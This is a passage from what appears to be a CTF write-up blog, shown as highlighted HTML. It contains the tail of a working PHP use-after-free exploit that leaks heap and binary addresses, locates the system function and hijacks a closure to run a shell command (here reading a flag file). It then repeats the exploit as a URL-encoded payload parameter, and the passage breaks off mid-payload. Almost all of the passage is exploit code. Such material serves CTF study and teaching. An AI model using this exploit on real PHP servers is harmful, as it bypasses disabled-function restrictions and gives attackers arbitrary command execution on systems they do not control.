class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"> </span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">c=%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%